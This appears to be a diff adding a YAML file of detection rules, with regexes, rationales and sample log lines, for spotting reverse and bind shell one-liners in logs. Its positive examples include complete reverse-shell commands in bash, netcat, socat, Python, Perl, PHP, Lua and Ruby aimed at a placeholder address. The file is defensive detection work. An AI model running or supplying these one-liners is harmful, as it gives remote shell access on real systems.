@@ -1,0 +1,857 @@
+# Mention patterns for reverse and bind shell one-liners, in any language, as they appear in raw text: shell history
+# shippers, web and application logs that echo a payload, exploit attempts captured by a WAF, or command text that
+# no typed parser normalized. The shapes come from the public reverse-shell catalogs cited per entry (the
+# revshells.com generator's command list and SigmaHQ rules); they are generalized with bounded gaps so one pattern
+# covers the variants that differ only in host, port, shell or spacing.
+#
+# A match says the text was present. It does not prove the shell ran or connected; that takes typed process and
+# network evidence.
+
+- id: mention.revshell.dev_tcp_stdio
+  title: Shell standard streams wired to a bash /dev/tcp or /dev/udp socket
+  match:
+    anchored: '/dev/(?:tcp|udp)/[A-Za-z0-9.:_-]{1,253}/[0-9]{1,5} {0,3}(?:0>&1|0<&1|<&1|>&0)'
+  case_sensitive: true
+  strength: strong
+  attack: [T1059.004, T1095]
+  telemetry: [any]
+  source:
+    name: Reverse Shell Generator (revshells.com) command catalog
+    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
+    license: MIT
+    upstream_id: null
+  rationale: >-
+    Redirecting a socket opened through bash's /dev/tcp onto standard input or output ('0>&1', '<&1') is the core of
+    every bash reverse shell variant. Health checks and wait-for-port scripts open /dev/tcp only to test a port and
+    redirect errors ('2>&1' or '2>/dev/null'), which this pattern does not accept.
+  examples:
+    positive:
+      - 'Nov 20 10:01:02 web01 bash[4242]: HISTORY: bash -i >& /dev/tcp/203.0.113.7/4444 0>&1'
+      - 'Nov 20 10:01:03 web01 php-fpm[880]: system(): sh -i >& /dev/udp/203.0.113.7/53 0>&1'
+      - 'Nov 20 10:01:04 sun02 sh[626]: sh >/dev/tcp/198.51.100.3/53 <&1 2>&1'
+    negative:
+      - 'Nov 20 10:01:05 web01 healthcheck: bash -c "echo > /dev/tcp/127.0.0.1/5432 2>&1" && echo db up'
+      - 'Nov 20 10:01:06 web01 entrypoint.sh: timeout 1 bash -c "</dev/tcp/db/5432" 2>/dev/null || sleep 1'
+
+- id: mention.revshell.dev_tcp_any
+  title: bash /dev/tcp or /dev/udp socket path with a host and port
+  match:
+    anchored: '/dev/(?:tcp|udp)/[A-Za-z0-9.:_-]{1,253}/[0-9]{1,5}'
+  case_sensitive: true
+  strength: weak
+  attack: [T1059.004, T1095, T1046]
+  telemetry: [any]
+  source:
+    name: Reverse Shell Generator (revshells.com) command catalog
+    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
+    license: MIT
+    upstream_id: null
+  rationale: >-
+    Any bash /dev/tcp socket path. Reverse shells, port scans and tool-less downloads use it, and so do container
+    health checks and wait-for scripts, so it is context only; the stdio entry above is the strong form.
+  examples:
+    positive:
+      - 'Nov 20 10:02:00 web01 bash[5013]: HISTORY: cat </dev/tcp/203.0.113.7/8000 > /tmp/.x'
+    negative:
+      - 'Nov 20 10:02:01 web01 bash[5014]: HISTORY: ls -l /dev/tty1'
+      - 'Nov 20 10:02:02 web01 kernel: [ 12.0] tcp: last ACK of /dev/null ignored'
+
+- id: mention.revshell.fifo_shell_to_client
+  title: Named pipe feeding a shell whose output goes to a network client
+  match:
+    anchored: 'mkfifo [^\n]{0,120}(?:/|\b)(?:ba|da|z|k|a)?sh(?: -i)?\b[^\n|]{0,60}\| {0,2}(?:nc|ncat|netcat|telnet|openssl)\b'
+  case_sensitive: false
+  strength: strong
+  attack: [T1059.004, T1095]
+  telemetry: [any]
+  source:
+    name: Reverse Shell Generator (revshells.com) command catalog
+    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
+    license: MIT
+    upstream_id: null
+  rationale: >-
+    The 'mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc host port > /tmp/f' family (also with ncat -u, telnet and
+    openssl s_client) loops a shell through a FIFO and a network client; it is the standard reverse shell where
+    netcat lacks -e. Database dump pipelines also use mkfifo but never pipe a shell into a network client.
+  examples:
+    positive:
+      - 'Nov 20 10:03:00 web01 bash[5100]: HISTORY: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 203.0.113.7 4444 >/tmp/f'
+      - 'Nov 20 10:03:01 web01 bash[5101]: HISTORY: mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 203.0.113.7:443 > /tmp/s; rm /tmp/s'
+    negative:
+      - 'Nov 20 10:03:02 db01 bash[5102]: HISTORY: mkfifo /tmp/pgpipe; pg_dump app | gzip > /tmp/pgpipe &'
+      - 'Nov 20 10:03:03 db01 bash[5103]: HISTORY: mkfifo /tmp/f; ssh backup01 "cat > /srv/dump" < /tmp/f'
+
+- id: mention.revshell.fifo_client_to_shell
+  title: Named pipe with a network client whose output feeds a shell
+  match:
+    anchored: 'mkfifo [^\n]{0,120}(?:telnet|nc|ncat|openssl s_client) [^\n|]{0,120}\| {0,2}(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b'
+  case_sensitive: false
+  strength: strong
+  attack: [T1059.004, T1095]
+  telemetry: [any]
+  source:
+    name: Reverse Shell Generator (revshells.com) command catalog
+    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
+    license: MIT
+    upstream_id: null
+  rationale: >-
+    The reverse ordering of the FIFO shell, 'mkfifo $TF && telnet host port 0<$TF | sh 1>$TF': a network client's
+    output is piped into a shell. No administrative pipeline feeds remote bytes to a shell through a FIFO.
+  examples:
+    positive:
+      - 'Nov 20 10:04:00 web01 bash[5104]: HISTORY: TF=$(mktemp -u);mkfifo $TF && telnet 203.0.113.7 23 0<$TF | sh 1>$TF'
+    negative:
+      - 'Nov 20 10:04:01 web01 bash[5105]: HISTORY: mkfifo /tmp/q && nc -l 9000 > /tmp/q &'
+      - 'Nov 20 10:04:02 web01 bash[5106]: HISTORY: mkfifo /var/run/app.fifo; chmod 600 /var/run/app.fifo'
+
+- id: mention.revshell.mknod_backpipe
+  title: mknod pipe chained to netcat or telnet
+  match:
+    anchored: 'mknod [^\n]{1,80} p {0,2}(?:&&|;)[^\n]{0,120}\b(?:nc|ncat|telnet)\b'
+  case_sensitive: false
+  strength: strong
+  attack: [T1059.004, T1095]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Suspicious Reverse Shell Command Line (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_susp_rev_shells.yml
+    license: DRL-1.1
+    upstream_id: 738d9bcf-6999-4fdb-b4ac-3033037db8ab
+  rationale: >-
+    Generalizes the rule's 'mknod /tmp/backpipe p && nc' and 'mknod /tmp/p p &&' keywords to any pipe name: on old
+    systems without mkfifo, a mknod FIFO chained to netcat or telnet is the reverse-shell loop. Device creation with
+    mknod uses c or b, not p, and is not followed by a network client.
+  examples:
+    positive:
+      - 'Nov 20 10:05:00 web01 bash[5107]: HISTORY: mknod /tmp/bp p && nc 203.0.113.7 80 0</tmp/bp | /bin/bash 1>/tmp/bp'
+    negative:
+      - 'Nov 20 10:05:01 web01 bash[5108]: HISTORY: mknod /dev/loop8 b 7 8'
+      - 'Nov 20 10:05:02 web01 bash[5109]: HISTORY: mknod /tmp/ctl p; chmod 600 /tmp/ctl'
+
+- id: mention.revshell.netcat_exec_first_flag
+  title: netcat executing a shell (exec flag in the first option group)
+  match:
+    anchored: 'nc -[a-zA-Z]{0,6}[ec] {0,2}(?:(?:/usr)?(?:/bin/)?(?:ba|da|z|k|c|tc|a)?sh\b|cmd(?:\.exe)?\b|powershell(?:\.exe)?\b)'
+  case_sensitive: true
+  strength: strong
+  attack: [T1059.004, T1095]
+  telemetry: [any]
+  source:
+    name: Reverse Shell Generator (revshells.com) command catalog
+    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
+    license: MIT
+    upstream_id: null
+  rationale: >-
+    netcat's -e (execute) or -c (run through sh) with a shell as the program is a bind or reverse shell; grouped flags
+    such as '-lvnpe /bin/sh' are covered. Case-sensitive so OpenBSD netcat's -C (send CRLF) is not read as -c.
+    rsync's '-e ssh' does not match because the program must be a shell.
+  examples:
+    positive:
+      - 'Nov 20 10:06:00 web01 bash[5110]: HISTORY: nc -e /bin/sh 203.0.113.7 4444'
+      - 'Nov 20 10:06:01 web01 bash[5111]: HISTORY: nc -lvnpe /bin/bash 4444'
+      - 'Nov 20 10:06:02 web01 bash[5112]: HISTORY: nc -c bash 203.0.113.7 4444'
+    negative:
+      - 'Nov 20 10:06:03 web01 bash[5113]: HISTORY: rsync -avz -e ssh /srv/ backup01:/srv/'
+      - 'Nov 20 10:06:04 web01 bash[5114]: HISTORY: nc -zv db01 5432'
+
+- id: mention.revshell.netcat_exec_later_flag
+  title: netcat executing a shell (exec flag after the host or port)
+  match:
+    anchored: ' nc [^|;&\n]{1,80} -[a-zA-Z]{0,5}[ec] {0,2}(?:(?:/usr)?(?:/bin/)?(?:ba|da|z|k|c|tc|a)?sh\b|cmd(?:\.exe)?\b|powershell(?:\.exe)?\b)'
+  case_sensitive: true
+  strength: strong
+  attack: [T1059.004, T1095]
+  telemetry: [any]
+  source:
+    name: Reverse Shell Generator (revshells.com) command catalog
+    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
+    license: MIT
+    upstream_id: null
+  rationale: >-
+    The 'nc host port -e shell' and 'busybox nc host port -e sh' orderings, when nc follows other text on the line.
+    Same meaning as the first-flag entry; a separate entry covers a line that starts with nc.
+  examples:
+    positive:
+      - 'Nov 20 10:07:00 cam01 sh[300]: busybox nc 203.0.113.7 4444 -e sh'
+      - 'Nov 20 10:07:01 web01 bash[5115]: HISTORY: cd /tmp; nc 203.0.113.7 4444 -e /bin/bash'
+    negative:
+      - 'Nov 20 10:07:02 web01 bash[5116]: HISTORY: echo stats | nc -q1 graphite 2003'
+      - 'Nov 20 10:07:03 web01 bash[5117]: HISTORY: tar cf - /srv | nc 10.0.0.9 9000 -q 1'
+
+- id: mention.revshell.netcat_exec_line_start
+  title: netcat executing a shell (line starts with nc)
+  match:
+    anchored: '^nc [^|;&\n]{1,80} -[a-zA-Z]{0,5}[ec] {0,2}(?:(?:/usr)?(?:/bin/)?(?:ba|da|z|k|c|tc|a)?sh\b|cmd(?:\.exe)?\b|powershell(?:\.exe)?\b)'
+  case_sensitive: true
+  strength: strong
+  attack: [T1059.004, T1095]
+  telemetry: [any]
+  source:
+    name: Reverse Shell Generator (revshells.com) command catalog
+    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
+    license: MIT
+    upstream_id: null
+  rationale: >-
+    Same as the mid-line entry for text that starts with the command, as in raw history files or a command-only field.
+  examples:
+    positive:
+      - 'nc 203.0.113.7 4444 -e /bin/sh'
+    negative:
+      - 'nc -zv 10.0.0.5 22-25'
+      - 'nc 10.0.0.9 9000 < /srv/backup.tar'
+
+- id: mention.revshell.ncat_exec
+  title: ncat executing a shell
+  match:
+    anchored: 'ncat(?:\.exe)? [^|;&\n]{0,80}(?:-[a-zA-Z]{0,5}[ec]|--exec|--sh-exec) {0,2}["'']?(?:(?:/usr)?(?:/bin/)?(?:ba|da|z|k|c|tc|a)?sh\b|cmd(?:\.exe)?\b|powershell(?:\.exe)?\b)'
+  case_sensitive: true
+  strength: strong
+  attack: [T1059.004, T1095]
+  telemetry: [any]
+  source:
+    name: Reverse Shell Generator (revshells.com) command catalog
+    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
+    license: MIT
+    upstream_id: null
+  rationale: >-
+    Nmap's ncat with -e/-c or --exec/--sh-exec bound to a shell, in any argument order and including ncat.exe; this
+    serves or sends a shell over the network.
+  examples:
+    positive:
+      - 'Nov 20 10:08:00 web01 bash[5118]: HISTORY: ncat 203.0.113.7 4444 -e /bin/bash'
+      - 'C:\Users\Public>ncat.exe 203.0.113.7 443 --exec cmd.exe'
+    negative:
+      - 'Nov 20 10:08:01 web01 bash[5119]: HISTORY: ncat --listen --keep-open 8443 --ssl'
+      - 'Nov 20 10:08:02 web01 bash[5120]: HISTORY: ncat -v --proxy 10.0.0.1:3128 example.org 443'
+
+- id: mention.revshell.netcat_long_name_exec
+  title: netcat (long name) executing a shell
+  match:
+    anchored: 'netcat [^|;&\n]{0,80}-[a-zA-Z]{0,5}[ec] {0,2}(?:(?:/usr)?(?:/bin/)?(?:ba|da|z|k|c|tc|a)?sh\b|cmd(?:\.exe)?\b)'
+  case_sensitive: true
+  strength: strong
+  attack: [T1059.004, T1095]
+  telemetry: [any]
+  source:
+    name: Reverse Shell Generator (revshells.com) command catalog
+    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
+    license: MIT
+    upstream_id: null
+  rationale: >-
+    The traditional and OpenBSD packages also install the binary as netcat; with -e or -c bound to a shell it is a
+    reverse or bind shell.
+  examples:
+    positive:
+      - 'Nov 20 10:09:00 web01 bash[5121]: HISTORY: netcat -e /bin/sh 203.0.113.7 4444'
+    negative:
+      - 'Start-Date: 2026-11-20  10:09:01  Commandline: apt-get -y install netcat-openbsd'
+      - 'Nov 20 10:09:02 web01 bash[5122]: HISTORY: netcat -zv 10.0.0.5 443'
+
+- id: mention.revshell.netcat_windows_exec
+  title: Windows netcat binary executing cmd or PowerShell
+  match:
+    anchored: 'nc\.exe["'']? [^|&\n]{0,80}-[a-zA-Z]{0,5}e {0,2}["'']?(?:cmd|powershell)(?:\.exe)?\b'
+  case_sensitive: false
+  strength: strong
+  attack: [T1059.003, T1095]
+  telemetry: [windows_text]
+  source:
+    name: Reverse Shell Generator (revshells.com) command catalog
+    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
+    license: MIT
+    upstream_id: null
+  rationale: >-
+    'nc.exe host port -e cmd.exe' sends a Windows command shell over a raw socket. Windows has no built-in netcat, so
+    its presence with -e is an intrusion tool. The 64-bit build nc64.exe is a separate entry.
+  examples:
+    positive:
+      - 'C:\Windows\Temp\nc.exe 203.0.113.7 443 -e cmd.exe'
+      - 'Process Create: CommandLine: "C:\ProgramData\nc.exe" -e powershell.exe 203.0.113.7 8080'
+    negative:
+      - 'C:\Tools\nc.exe -zv 10.0.0.5 3389'
+      - 'C:\Windows\system32\cmd.exe /c ipconfig /all'
+
+- id: mention.revshell.netcat64_windows_exec
+  title: Windows 64-bit netcat binary executing cmd or PowerShell
+  match:
+    anchored: 'nc64\.exe["'']? [^|&\n]{0,80}-[a-zA-Z]{0,5}e {0,2}["'']?(?:cmd|powershell)(?:\.exe)?\b'
+  case_sensitive: false
+  strength: strong
+  attack: [T1059.003, T1095]
+  telemetry: [windows_text]
+  source:
+    name: Reverse Shell Generator (revshells.com) command catalog
+    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
+    license: MIT
+    upstream_id: null
+  rationale: >-
+    Same as the nc.exe entry for the commonly distributed 64-bit build, nc64.exe: a Windows shell bound to a raw
+    socket by an intrusion tool.
+  examples:
+    positive:
+      - 'Process Create: CommandLine: "C:\ProgramData\nc64.exe" -e powershell.exe 203.0.113.7 8080'
+    negative:
+      - 'C:\Tools\nc.exe -zv 10.0.0.5 3389'
+      - 'C:\Windows\system32\cmd.exe /c ipconfig /all'
+
+- id: mention.revshell.socat_exec_shell
+  title: socat binding a shell to a socket
+  match:
+    anchored: 'socat [^\n]{0,120}(?:exec|system):["'']?(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b'
+  case_sensitive: false
+  strength: strong
+  attack: [T1059.004, T1095]
+  telemetry: [any]
+  source:
+    name: Reverse Shell Generator (revshells.com) command catalog
+    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
+    license: MIT
+    upstream_id: null
+  rationale: >-
+    socat with an EXEC or SYSTEM address running a shell connects the shell to the other address (TCP, UDP, SSL);
+    this is the socat reverse or bind shell in any argument order. Serial and PPP setups exec other programs.
+  examples:
+    positive:
+      - 'Nov 20 10:10:00 web01 bash[5123]: HISTORY: socat TCP:203.0.113.7:4444 EXEC:/bin/bash'
+      - 'Nov 20 10:10:01 web01 bash[5124]: HISTORY: socat TCP:203.0.113.7:443 EXEC:''bash'',pty,stderr,setsid,sigint,sane'
+    negative:
+      - 'Nov 20 10:10:02 gw01 bash[5125]: HISTORY: socat PTY,link=/dev/ttyV0 EXEC:''/usr/sbin/pppd call isp'''
+      - 'Nov 20 10:10:03 gw01 bash[5126]: HISTORY: socat TCP-LISTEN:8080,fork TCP:10.0.0.8:80'
+
+- id: mention.revshell.socat_full_tty
+  title: socat full-TTY options used for interactive remote shells
+  match:
+    literal: ['pty,stderr,setsid,sigint,sane']
+  case_sensitive: false
+  strength: strong
+  attack: [T1059.004, T1095]
+  telemetry: [any]
+  source:
+    name: Reverse Shell Generator (revshells.com) command catalog
+    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
+    license: MIT
+    upstream_id: null
+  rationale: >-
+    This option string gives the shell on the far side of socat a real terminal with job control; it exists in
+    practice only in fully interactive reverse shells.
+  examples:
+    positive:
+      - 'Nov 20 10:11:00 web01 bash[5127]: HISTORY: ./socat exec:''bash -li'',pty,stderr,setsid,sigint,sane tcp:203.0.113.7:4444'
+    negative:
+      - 'Nov 20 10:11:01 gw01 bash[5128]: HISTORY: socat PTY,link=/dev/ttyS10,raw,echo=0 PTY,link=/dev/ttyS11,raw,echo=0'
+      - 'Nov 20 10:11:02 gw01 bash[5129]: HISTORY: socat - UNIX-CONNECT:/run/app.sock'
+
+- id: mention.revshell.python_socket_shell
+  title: Python socket connect followed by fd duplication or a spawned shell
+  match:
+    anchored: 'socket\.socket\([^\n]{0,200}\.connect\(\([^\n]{0,300}(?:dup2|pty\.spawn|subprocess\.(?:call|Popen|run|check_output)\()'
+  case_sensitive: false
+  strength: strong
+  attack: [T1059.006, T1095]
+  telemetry: [any]
+  source:
+    name: Reverse Shell Generator (revshells.com) command catalog
+    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
+    license: MIT
+    upstream_id: null
+  rationale: >-
+    A one-line Python program that opens a socket, connects it and then duplicates descriptors onto it or spawns a
+    shell is the Python reverse shell. Normal Python clients connect and send data; they do not dup2 the socket onto
+    stdin/stdout.
+  examples:
+    positive:
+      - 'Nov 20 10:12:00 web01 bash[5130]: HISTORY: python3 -c ''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("203.0.113.7",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'''
+      - 'Nov 20 10:12:01 web01 bash[5131]: HISTORY: python3 -c ''import os,pty,socket;s=socket.socket();s.connect(("203.0.113.7",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'''
+    negative:
+      - 'Nov 20 10:12:02 web01 app[700]: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((host, 443)); s.sendall(payload)'
+      - 'Nov 20 10:12:03 web01 bash[5132]: HISTORY: python3 -c "import socket; print(socket.gethostname())"'
+
+- id: mention.revshell.python_dup2_fileno
+  title: Python dup2 of an object's descriptor onto stdin, stdout or stderr
+  match:
+    anchored: 'dup2\( {0,2}[A-Za-z_]{1,16}\.fileno\(\) {0,2}, {0,2}[0-2] {0,2}\)'
+  case_sensitive: true
+  strength: medium
+  attack: [T1059.006]
+  telemetry: [any]
+  source:
+    name: Reverse Shell Generator (revshells.com) command catalog
+    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
+    license: MIT
+    upstream_id: null
+  rationale: >-
+    'os.dup2(s.fileno(),0)' rewires the standard streams onto another object, almost always a socket in reverse
+    shells. Daemonizing code redirects streams onto /dev/null the same way, so on its own this is medium.
+  examples:
+    positive:
+      - 'Nov 20 10:13:00 web01 bash[5133]: HISTORY: python -c "...;os.dup2(s.fileno(),0);os.dup2(s.fileno(),1)"'
+    negative:
+      - 'Nov 20 10:13:01 web01 app[700]: os.dup2(devnull.fileno(), sys.stdout.fileno())'
+      - 'Nov 20 10:13:02 web01 app[700]: os.dup2(fd, 1)'
+
+- id: mention.revshell.python_pty_spawn_shell
+  title: Python pty.spawn of a shell
+  match:
+    anchored: 'pty\.spawn\( {0,2}["''](?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh["'']'
+  case_sensitive: true
+  strength: strong
+  attack: [T1059.006, T1059.004]
+  telemetry: [any]
+  source:
+    name: Reverse Shell Generator (revshells.com) command catalog
+    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
+    license: MIT
+    upstream_id: null
+  rationale: >-
+    Spawning a shell on a pseudo-terminal from Python is the standard upgrade of a captured reverse shell to an
+    interactive one, in any import form. Terminal tooling written in Python spawns specific programs, not a bare
+    shell from a one-liner.
+  examples:
+    positive:
+      - 'Nov 20 10:14:00 web01 bash[5134]: HISTORY: python3 -c ''import pty;pty.spawn("/bin/bash")'''
+    negative:
+      - 'Nov 20 10:14:01 web01 app[700]: pty.spawn(argv, master_read)'
+      - 'Nov 20 10:14:02 web01 bash[5135]: HISTORY: python3 -c "import pty; print(pty.STDIN_FILENO)"'
+
+- id: mention.revshell.perl_socket_stdin
+  title: Perl Socket one-liner that reopens STDIN onto the socket
+  match:
+    anchored: 'use Socket;[^\n]{0,300}open\( {0,2}STDIN {0,2}, {0,2}["'']>&'
+  case_sensitive: false
+  strength: strong
+  attack: [T1059.006, T1095]
+  telemetry: [any]
+  source:
+    name: Reverse Shell Generator (revshells.com) command catalog
+    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
+    license: MIT
+    upstream_id: null
+  rationale: >-
+    The perl -e reverse shell connects a Socket and reopens STDIN/STDOUT onto it before exec'ing a shell; Perl
+    network clients do not reopen STDIN onto their socket.
+  examples:
+    positive:
+      - 'Nov 20 10:15:00 web01 bash[5136]: HISTORY: perl -e ''use Socket;$i="203.0.113.7";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");exec("/bin/sh -i");};'''
+    negative:
+      - 'Nov 20 10:15:01 mon01 check_tcp.pl[800]: use Socket; connect to 10.0.0.5:443 ok'
+      - 'Nov 20 10:15:02 web01 bash[5137]: HISTORY: perl -e ''open(STDIN, "<", "/tmp/input.txt")'''
+
+- id: mention.revshell.perl_io_socket_exec
+  title: Perl IO::Socket::INET client that hands the socket to a shell
+  match:
+    anchored: 'IO::Socket::INET\( {0,2}PeerAddr[^\n]{0,200}(?:fdopen|system|exec)'
+  case_sensitive: false
+  strength: strong
+  attack: [T1059.006, T1095]
+  telemetry: [any]
+  source:
+    name: Reverse Shell Generator (revshells.com) command catalog
+    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
+    license: MIT
+    upstream_id: null
+  rationale: >-
+    'perl -MIO -e ... new IO::Socket::INET(PeerAddr, ...); STDIN->fdopen($c, r); ... system$_ while<>' is the forked
+    Perl reverse shell. Monitoring scripts create the same object but do not fdopen standard streams on it or run
+    received lines.
+  examples:
+    positive:
+      - 'Nov 20 10:16:00 web01 bash[5138]: HISTORY: perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"203.0.113.7:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'''
+    negative:
+      - 'Nov 20 10:16:01 mon01 check_smtp[801]: IO::Socket::INET(PeerAddr => "mail01:25") connected'
+      - 'Nov 20 10:16:02 web01 bash[5139]: HISTORY: perldoc IO::Socket::INET'
+
+- id: mention.revshell.php_fsockopen_exec
+  title: PHP fsockopen followed by command execution
+  match:
+    anchored: 'fsockopen\([^\n]{1,200}\);[^\n]{0,80}(?:exec|shell_exec|system|passthru|popen|proc_open)\('
+  case_sensitive: false
+  strength: strong
+  attack: [T1059.004, T1095, T1505.003]
+  telemetry: [any]
+  source:
+    name: Reverse Shell Generator (revshells.com) command catalog
+    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
+    license: MIT
+    upstream_id: null
+  rationale: >-
+    'php -r $sock=fsockopen(host,port);exec("sh <&3 >&3 2>&3")' and its shell_exec, system, passthru, popen and
+    proc_open variants: a socket is opened and a command is run on the same line. PHP applications open sockets for
+    mail and APIs, but not followed directly by command execution.
+  examples:
+    positive:
+      - 'Nov 20 10:17:00 web01 bash[5140]: HISTORY: php -r ''$sock=fsockopen("203.0.113.7",4444);exec("/bin/sh -i <&3 >&3 2>&3");'''
+    negative:
+      - 'Nov 20 10:17:01 web01 php-fpm[880]: PHP Warning: fsockopen(): unable to connect to mail01:25 (Connection refused)'
+      - 'Nov 20 10:17:02 web01 php-fpm[880]: PHP Notice: exec() has been disabled for security reasons'
+
+- id: mention.revshell.php_proc_open_shell
+  title: PHP proc_open of a shell with socket descriptors
+  match:
+    anchored: 'proc_open\( {0,2}["''](?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh["''] {0,2}, {0,2}(?:\[|array\() {0,2}\$'
+  case_sensitive: false
+  strength: strong
+  attack: [T1059.004, T1505.003]
+  telemetry: [any]
+  source:
+    name: Reverse Shell Generator (revshells.com) command catalog
+    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
+    license: MIT
+    upstream_id: null
+  rationale: >-
+    proc_open("sh", [$s,$s,$s], $p) hands a socket variable to a shell as all three descriptors. Applications that
+    use proc_open run specific programs with pipe descriptor specs, not a bare shell on variables.
+  examples:
+    positive:
+      - 'Nov 20 10:18:00 web01 bash[5141]: HISTORY: php -r ''$s=fsockopen("203.0.113.7",4444);proc_open("sh",[$s,$s,$s],$p);'''
+    negative:
+      - 'Nov 20 10:18:01 web01 php-fpm[880]: proc_open("/usr/bin/convert", [["pipe","r"],["pipe","w"]], $pipes)'
+      - 'Nov 20 10:18:02 web01 php-fpm[880]: PHP Warning: proc_open(): fork failed - Cannot allocate memory'
+
+- id: mention.revshell.fd_triple_redirect
+  title: Shell with stdin, stdout and stderr all on one numbered descriptor
+  match:
+    literal: ['<&3 >&3 2>&3', '<&196 >&196 2>&196', '0<&5 1>&5 2>&5', '<&%d >&%d 2>&%d']
+  case_sensitive: true
+  strength: strong
+  attack: [T1059.004, T1095]
+  telemetry: [any]
+  source:
+    name: Reverse Shell Generator (revshells.com) command catalog
+    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
+    license: MIT
+    upstream_id: null
+  rationale: >-
+    Pointing all three standard streams at the same inherited descriptor (3, 5, 196 or a printf placeholder) attaches
+    a shell to a socket opened by the parent: PHP, Lua, Ruby and bash reverse shells share it. Scripts save and
+    restore descriptors ('exec 3>&1') but do not send all three to one.
+  examples:
+    positive:
+      - 'Nov 20 10:19:00 web01 bash[5142]: HISTORY: lua -e "require(''socket'');t=socket.tcp();t:connect(''203.0.113.7'',''4444'');os.execute(''/bin/sh -i <&3 >&3 2>&3'');"'
+      - 'Nov 20 10:19:01 web01 bash[5143]: HISTORY: bash -i 5<> /dev/tcp/203.0.113.7/4444 0<&5 1>&5 2>&5'
+    negative:
+      - 'Nov 20 10:19:02 web01 bash[5144]: HISTORY: exec 3>&1 4>&2'
+      - 'Nov 20 10:19:03 web01 bash[5145]: HISTORY: ./build.sh 2>&1 | tee build.log'
+
+- id: mention.revshell.ruby_rsocket
+  title: Ruby one-liner loading the socket library
+  match:
+    anchored: 'ruby {1,3}-rsocket {0,3}-e'
+  case_sensitive: false
+  strength: medium
+  attack: [T1059.004, T1095]
+  telemetry: [any]
+  source:
+    name: Reverse Shell Generator (revshells.com) command catalog
+    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
+    license: MIT
+    upstream_id: null
+  rationale: >-
+    'ruby -rsocket -e' opens every Ruby reverse shell variant. A developer can use it for a quick socket test, so on
+    its own it is medium; the TCPSocket-to-shell entry is the strong form.
+  examples:
+    positive:
+      - 'Nov 20 10:20:00 web01 bash[5146]: HISTORY: ruby -rsocket -e''c=TCPSocket.new("203.0.113.7","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'''
+    negative:
+      - 'Nov 20 10:20:01 web01 bash[5147]: HISTORY: ruby -rjson -e ''puts JSON.parse(File.read("a.json"))'''
+      - 'Nov 20 10:20:02 web01 bash[5148]: HISTORY: ruby -v'
+
+- id: mention.revshell.ruby_spawn_tcpsocket
+  title: Ruby spawn of a shell with standard streams on a TCPSocket
+  match:
+    literal: ['[:in,:out,:err]=>TCPSocket']
+  case_sensitive: false
+  strength: strong
